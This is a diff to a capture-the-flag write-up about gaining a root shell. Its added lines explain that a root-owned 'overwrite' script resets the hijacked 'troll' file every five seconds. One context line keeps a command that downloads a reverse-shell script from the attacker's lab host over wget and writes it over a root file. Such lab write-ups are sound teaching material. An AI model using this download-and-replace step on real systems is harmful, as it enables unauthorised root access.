@@ -174,6 +174,11 @@ sudo wget http://10.10.14.8:8000/rev_shell.py -O /root/troll
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/ee1abc40-ef93-490b-8150-376696d7e990)
 
 + **Terminal [2][5]:** Get the root shell.
++ On method 2, be quick. That’s because of the overwrite script resetting troll to it's original self every 5 seconds.
++ After getting the root shell, there's **overwrite** script in the root home directory in the below.
++ **troll** is set back to its default state regularly every 5 seconds.
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/be491ee5-fad3-4815-adee-59400f8fc964)
 
 
 # References & Alternatives:
